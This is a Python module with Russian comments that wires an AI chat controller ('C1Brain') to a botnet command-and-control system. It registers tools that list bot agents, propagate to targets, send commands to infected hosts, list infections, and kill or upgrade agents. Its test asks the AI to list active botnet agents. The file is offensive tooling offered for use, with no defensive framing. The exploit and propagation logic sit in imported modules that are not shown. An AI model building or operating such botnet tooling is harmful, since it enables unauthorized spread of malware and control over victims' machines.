#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Модуль инициализации интеграции C1 и C2
Устанавливает связь между компонентами и регистрирует инструменты в C1Brain
"""

import os
import sys
import json
import logging
import asyncio
from typing import Dict, List, Any, Optional

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='c2_integration.log'
)
logger = logging.getLogger('C2Integration')

# Импортируем необходимые модули
from core.c1_brain import C1Brain
from core.c2_controller import C2Controller, C2API

class IntegrationManager:
    """Класс для управления интеграцией между C1 и C2"""
    
    def __init__(self, c1_brain: C1Brain, c2_controller: C2Controller):
        """
        Инициализация менеджера интеграции
        
        Args:
            c1_brain: Экземпляр C1Brain
            c2_controller: Экземпляр C2Controller
        """
        self.c1_brain = c1_brain
        self.c2_controller = c2_controller
        self.c2_api = C2API(c2_controller)
        
        # Настройка C1Brain для работы с C2
        self.c1_brain.controller = c2_controller
        
        logger.info("IntegrationManager initialized")
    
    def register_c2_tools(self):
        """Регистрирует инструменты C2 в C1Brain"""
        # Создаем мапу инструментов для регистрации
        tools = {
            "get_agents": self._get_agents_wrapper,
            "propagate": self._propagate_wrapper,
            "add_command": self._add_command_wrapper,
            "get_stats": self._get_stats_wrapper,
            "search_agents": self._search_agents_wrapper,
            "get_infections": self._get_infections_wrapper,
            "kill_agent": self._kill_agent_wrapper,
            "upgrade_agent": self._upgrade_agent_wrapper
        }
        
        # Регистрируем инструменты в C1Brain
        self.c1_brain.register_module_tools("c2", tools)
        
        logger.info(f"Registered {len(tools)} C2 tools in C1Brain")
    
    # Обертки для методов C2API, адаптированные для инструментов C1Brain
    
    async def _get_agents_wrapper(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Получает список агентов ботнета"""
        try:
            logger.info(f"Getting agents with params: {params}")
            agents = self.c2_api.get_agents()
            return {"status": "success", "agents": agents}
        except Exception as e:
            logger.error(f"Error getting agents: {e}")
            return {"status": "error", "message": str(e)}
    
    async def _propagate_wrapper(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Запускает распространение на указанные цели"""
        try:
            targets = params.get("targets", [])
            techniques = params.get("techniques", [])
            
            if not targets:
                return {"status": "error", "message": "No targets specified"}
            
            logger.info(f"Propagating to targets: {targets} using techniques: {techniques}")
            result = self.c2_api.propagate_to_targets(targets, techniques)
            return {"status": "success", "operation_id": result.get("operation_id"), "targets": targets}
        except Exception as e:
            logger.error(f"Error propagating to targets: {e}")
            return {"status": "error", "message": str(e)}
    
    async def _add_command_wrapper(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Добавляет команду для агента"""
        try:
            agent_id = params.get("agent_id")
            command_type = params.get("command_type")
            command_args = params.get("command_args", {})
            
            if not agent_id:
                return {"status": "error", "message": "No agent_id specified"}
            
            if not command_type:
                return {"status": "error", "message": "No command_type specified"}
            
            logger.info(f"Adding command {command_type} to agent {agent_id}")
            result = self.c2_api.add_command(agent_id, command_type, command_args)
            return {"status": "success", "command_id": result.get("command_id")}
        except Exception as e:
            logger.error(f"Error adding command: {e}")
            return {"status": "error", "message": str(e)}
    
    async def _get_stats_wrapper(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Получает статистику ботнета"""
        try:
            logger.info("Getting botnet statistics")
            stats = self.c2_api.get_stats()
            return {"status": "success", "stats": stats}
        except Exception as e:
            logger.error(f"Error getting stats: {e}")
            return {"status": "error", "message": str(e)}
    
    async def _search_agents_wrapper(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Поиск агентов по критериям"""
        try:
            criteria = params.get("criteria", {})
            logger.info(f"Searching agents with criteria: {criteria}")
            
            agents = self.c2_api.search_agents(criteria)
            return {"status": "success", "agents": agents}
        except Exception as e:
            logger.error(f"Error searching agents: {e}")
            return {"status": "error", "message": str(e)}
    
    async def _get_infections_wrapper(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Получает информацию о зараженных системах"""
        try:
            agent_id = params.get("agent_id")
            
            if agent_id:
                logger.info(f"Getting infections for agent: {agent_id}")
                infections = self.c2_api.get_agent_infections(agent_id)
            else:
                logger.info("Getting all infections")
                infections = self.c2_api.get_all_infections()
                
            return {"status": "success", "infections": infections}
        except Exception as e:
            logger.error(f"Error getting infections: {e}")
            return {"status": "error", "message": str(e)}
    
    async def _kill_agent_wrapper(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Отправляет команду на самоуничтожение агента"""
        try:
            agent_id = params.get("agent_id")
            
            if not agent_id:
                return {"status": "error", "message": "No agent_id specified"}
            
            logger.info(f"Killing agent: {agent_id}")
            result = self.c2_api.kill_agent(agent_id)
            return {"status": "success", "result": result}
        except Exception as e:
            logger.error(f"Error killing agent: {e}")
            return {"status": "error", "message": str(e)}
    
    async def _upgrade_agent_wrapper(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Обновляет агент на новую версию"""
        try:
            agent_id = params.get("agent_id")
            version = params.get("version", "latest")
            
            if not agent_id:
                return {"status": "error", "message": "No agent_id specified"}
            
            logger.info(f"Upgrading agent {agent_id} to version {version}")
            result = self.c2_api.upgrade_agent(agent_id, version)
            return {"status": "success", "result": result}
        except Exception as e:
            logger.error(f"Error upgrading agent: {e}")
            return {"status": "error", "message": str(e)}

# Функция для инициализации интеграции
def init_integration(c1_brain=None, c2_controller=None) -> IntegrationManager:
    """
    Инициализирует интеграцию между C1 и C2
    
    Args:
        c1_brain: Экземпляр C1Brain (если None, создается новый)
        c2_controller: Экземпляр C2Controller (если None, создается новый)
        
    Returns:
        Экземпляр IntegrationManager
    """
    # Создаем компоненты, если не переданы
    if c1_brain is None:
        from core.c1_brain import C1Brain
        c1_brain = C1Brain()
        logger.info("Created new C1Brain instance")
    
    if c2_controller is None:
        from core.c2_controller import C2Controller
        c2_controller = C2Controller()
        logger.info("Created new C2Controller instance")
    
    # Создаем менеджер интеграции
    integration = IntegrationManager(c1_brain, c2_controller)
    
    # Регистрируем инструменты
    integration.register_c2_tools()
    
    logger.info("C1-C2 integration initialized successfully")
    return integration

# Тестовый код
if __name__ == "__main__":
    async def test():
        # Инициализируем интеграцию
        from core.c1_brain import C1Brain
        from core.c2_controller import C2Controller
        
        c1_brain = C1Brain()
        c2_controller = C2Controller()
        
        integration = init_integration(c1_brain, c2_controller)
        
        # Проверяем доступность инструментов
        print("C2 Tools registered in C1Brain:")
        for tool_name in c1_brain.session_context["tools"]:
            if tool_name.startswith("c2_"):
                print(f"- {tool_name}")
        
        # Тестируем вызов инструмента
        result = await c1_brain.process_chat("Покажи мне список активных агентов в ботнете")
        print("\nChat Response:")
        print(result)
    
    asyncio.run(test()) 